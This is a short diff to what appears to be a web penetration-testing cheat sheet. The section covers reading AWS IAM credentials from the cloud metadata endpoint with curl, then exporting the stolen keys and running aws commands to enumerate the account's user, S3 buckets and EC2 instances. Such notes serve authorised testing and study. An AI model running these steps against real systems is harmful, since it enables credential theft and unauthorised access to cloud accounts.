@@ -421,9 +421,13 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
 
 ```
-export aws_access_key_id=<access_key_id>  
-export aws_secret_access_key=<secret_access_key>  
-export aws_session_token=<session_token>  
+export AWS_ACCESS_KEY_ID=<access_key_id>  
+export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
+export AWS_SESSION_TOKEN=<session_token> 
+
+aws iam get-user
+aws s3 ls
+aws ec2 describe-instances
 ```
 
 ### Tools
